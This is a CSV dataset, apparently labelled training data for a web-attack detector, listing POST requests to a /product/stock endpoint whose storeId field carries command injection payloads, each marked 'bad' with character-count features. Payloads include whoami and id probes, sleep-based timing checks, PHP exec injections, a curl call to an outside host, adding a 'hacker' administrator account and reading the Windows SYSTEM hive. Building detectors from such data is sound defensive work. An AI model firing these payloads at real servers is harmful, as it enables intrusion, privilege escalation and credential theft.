method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 '&&echo TWKYHE$((0+57))$(echo TWKYHE)TWKYHE|,0,1,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSSFRDQJ$((5+47))$(echo$IFSSFRDQJ)SFRDQJ\\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo FUZHOM$((22+69))$(echo FUZHOM)FUZHOM\\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSEPLQYO$((94+56))$(echo$IFSEPLQYO)EPLQYO',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo XDTLTK) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 \\,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSDOPRZR$((76+69))$(echo$IFSDOPRZR)DOPRZR|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSPKOWIK$((48+16))$(echo$IFSPKOWIK)PKOWIK\,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${shell_exec(print(`echo WBZBZE;echo $((19+87));echo WBZBZE;echo WBZBZE`);.%22WBZBZE,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 ${proc_open(print(`echo XAKQYF;echo $((41+51));echo XAKQYF;echo XAKQYF`);XAKQYF,0,0,2,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo NWAYIZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '; str=$(echo RCYHEM); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo BXLXVP)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSUZURTK$((89+35))$(echo$IFSUZURTK)UZURTK",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ;echo$IFSKYWEBG$((28+35))$(echo$IFSKYWEBG)KYWEBG""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSBJUKKI$((91+15))$(echo$IFSBJUKKI)BJUKKI|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;id\n,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSCKVBFP$((70+7))$(echo$IFSCKVBFP)CKVBFP\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo RDKWWC$((22+44))$(echo RDKWWC)RDKWWC',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo LBFVNS) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 #,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HKGDXH)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSCVWJPC$((74+17))$(echo$IFSCVWJPC)CVWJPC'",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo EYXSLH$((96+88))$(echo EYXSLH)EYXSLH|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '||echo$IFSHZAALW$((51+4))$(echo$IFSHZAALW)HZAALW""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 )print(`echo YKQUFP\necho $((94+91))\necho YKQUFP\necho YKQUFP`);.%252522YKQUFP,0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 )print(`echo FGPZFR
echo $((7+1))
echo FGPZFR
echo FGPZFR`);.%2527FGPZFR",0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo GJNRXW); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 <?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",0,0,0,0,1,1,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo XSPTNK$((94+10))$(echo XSPTNK)XSPTNK//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSUTHIQI$((14+78))$(echo$IFSUTHIQI)UTHIQI",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo LAPJJF$((87+11))$(echo LAPJJF)LAPJJF|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 6 -ne $(echo CVUCAT | tr -d '\n' | wc -c) ] || sleep 1 ',0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSVVVVVP$((21+21))$(echo$IFSVVVVVP)VVVVVP//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 1 -ne $(echo CVUCAT | tr -d '\n' | wc -c) ] || sleep 1 ',0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo LAHTXU$((26+18))$(echo LAHTXU)LAHTXU&",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 && sleep 5,0,1,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | system('sleep 5');,0,0,0,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo BLBAVR$((79+49))$(echo BLBAVR)BLBAVR&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "" echo TZZNSL$((92+66))$(echo TZZNSL)TZZNSL\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo HSRGRG) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %7C,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ERVJHE); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | [ 3 -ne $(echo ZDEVVW | tr -d '\n' | wc -c) ] || sleep 1 ',0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '|echo VQUOCA$((12+35))$(echo VQUOCA)VQUOCA',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo QKCGPP$((73+25))$(echo QKCGPP)QKCGPP",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${proc_open(print(`echo MLSOYZ;echo $((72+12));echo MLSOYZ;echo MLSOYZ`);.%22MLSOYZ,0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo RBCZEH$((34+18))$(echo RBCZEH)RBCZEH\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '|echo QIQGXS$((79+42))$(echo QIQGXS)QIQGXS',0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo SGRKCG`.`echo $((91+4))`.`echo SGRKCG`.`echo SGRKCG`);.""SGRKCG",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSJNESPQ$((88+93))$(echo$IFSJNESPQ)JNESPQ'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'print(`echo BRTYSY\necho $((74+40))\necho BRTYSY\necho BRTYSY`);BRTYSY,0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo LMRVVK)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo VYCNRP)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo CYXVMU$((24+36))$(echo CYXVMU)CYXVMU|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 \nid;,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo IYHUSO) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 |,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo IHELYG$((76+62))$(echo IHELYG)IHELYG&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSHHTXHL$((49+36))$(echo$IFSHHTXHL)HHTXHL'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo BYUJUS)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo ZBAFWV$((66+6))$(echo ZBAFWV)ZBAFWV\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo GUASVW); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '|echo TQBVPR$((29+56))$(echo TQBVPR)TQBVPR',0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo HUGKZQ$((0+67))$(echo HUGKZQ)HUGKZQ\",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo WHBQCR$((5+15))$(echo WHBQCR)WHBQCR'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & net localgroup Administrators hacker /ADD,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo DHYUHH); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 
echo SJTIHB$((1+37))$(echo SJTIHB)SJTIHB\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo MATZOK) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %2F%2F,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSBVGJOE$((17+25))$(echo$IFSBVGJOE)BVGJOE\",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo TQHCUN$((6+71))$(echo TQHCUN)TQHCUN,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo PRMMPK$((67+45))$(echo PRMMPK)PRMMPK\\,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSQAACSL$((16+49))$(echo$IFSQAACSL)QAACSL&",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 7 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo TLXEJK); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo CKFAYE$((18+45))$(echo CKFAYE)CKFAYE\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo KLODWM$((81+43))$(echo KLODWM)KLODWM&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo PMIRHD$((95+94))$(echo PMIRHD)PMIRHD\",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo FHWWQB$((42+27))$(echo FHWWQB)FHWWQB',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo PUPQPK); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo YQCCXV$((3+76))$(echo YQCCXV)YQCCXV,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 3 -ne $(echo TYMEOG | tr -d '\n' | wc -c) ] || sleep 1 //,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSHDKHON$((74+41))$(echo$IFSHDKHON)HDKHON\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo YQABCF)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo EHNNQT) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSUGBSBK$((46+64))$(echo$IFSUGBSBK)UGBSBK',0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo QZBRFT); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | type %SYSTEMROOT%\repair\SYSTEM,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSKPOBYP$((90+6))$(echo$IFSKPOBYP)KPOBYP\\",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo FTWOKG | tr -d '\n' | wc -c) ] || sleep 1 %7C,0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo TJXONB$((49+24))$(echo TJXONB)TJXONB|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 {{person.name}},0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 |echo JQHGOG$((52+28))$(echo JQHGOG)JQHGOG//,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSCMWXRB$((87+22))$(echo$IFSCMWXRB)CMWXRB//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSBKQZPW$((40+60))$(echo$IFSBKQZPW)BKQZPW\\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 5 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ');}print(`echo HDQYRP`.`echo $((43+86))`.`echo HDQYRP`.`echo HDQYRP`);.""HDQYRP",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSKVTRBW$((82+81))$(echo$IFSKVTRBW)KVTRBW'",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo VYZGPJ$((27+25))$(echo VYZGPJ)VYZGPJ',0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo OMAHVH$((14+99))$(echo OMAHVH)OMAHVH\\",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 )print(`echo VWOEOC`.`echo $((97+4))`.`echo VWOEOC`.`echo VWOEOC`);VWOEOC,0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo OTTCBX;echo $((64+75));echo OTTCBX;echo OTTCBX`);OTTCBX",0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 7 -ne $(echo SYHTME | tr -d '\n' | wc -c) ] || sleep 1 //",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSBUIOLU$((83+61))$(echo$IFSBUIOLU)BUIOLU'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo QZBRFT); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %2F%2F,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ${exec(print(`echo LWNHYJ
echo $((0+21))
echo LWNHYJ
echo LWNHYJ`);%2529%257DLWNHYJ",0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 7 -ne $(echo JNNROP | tr -d '\n' | wc -c) ] || sleep 1 //,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &echo HJRGTK$((97+88))$(echo HJRGTK)HJRGTK""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSMKSRXM$((30+19))$(echo$IFSMKSRXM)MKSRXM|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSIEOSEZ$((86+74))$(echo$IFSIEOSEZ)IEOSEZ',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo ROWALZ)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSPXHSMC$((2+51))$(echo$IFSPXHSMC)PXHSMC//",0,0,4,0,0,0,0,2,bad
